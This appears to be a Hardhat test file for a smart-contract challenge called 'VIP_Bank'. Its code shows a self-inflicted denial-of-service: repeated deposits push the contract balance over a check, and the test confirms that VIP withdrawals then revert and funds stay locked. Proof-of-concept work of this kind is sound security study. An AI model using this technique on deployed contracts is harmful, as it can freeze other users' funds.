const { expect } = require("chai");
const { ethers, provider } = require("hardhat")

describe("VIPBank contract", function () {
  it("Deploy VIPBank and lock the VIP user balance forever into the contract", async function () {
	const [owner, vip, attacker] = await ethers.getSigners();

    const VIPBankFactory = await ethers.getContractFactory("VIP_Bank");

    const hhVIPBank = await VIPBankFactory.deploy();
	await hhVIPBank.deployed()
	
	let result = await hhVIPBank.contractBalance()
	console.log("Contract Balance: ", result)
	
	// add VIP address to VIP contract mapping
	await hhVIPBank.addVIP(vip.address)
	
	// test VIP deposit and withdraw functions
	await hhVIPBank.connect(vip).deposit({ value: ethers.utils.parseEther("0.05") })
	result = await hhVIPBank.connect(vip).contractBalance()
	// console.log("VIP Balance: ", result)
	
	await hhVIPBank.connect(vip).withdraw(ethers.utils.parseEther("0.05"))
	result = await hhVIPBank.connect(vip).contractBalance()
	// console.log("VIP Balance: ", result)
	
	// begin attack (against myself)
	for(let i = 0; i < 11; i++) {
		await hhVIPBank.connect(vip).deposit({ value: ethers.utils.parseEther("0.05") })
	}
	
	// see if I'm locked out
	await expect(hhVIPBank.connect(vip).withdraw(ethers.utils.parseEther("0.05"))).to.be.revertedWith("Cannot withdraw more than 0.5 ETH per transaction")
  });
});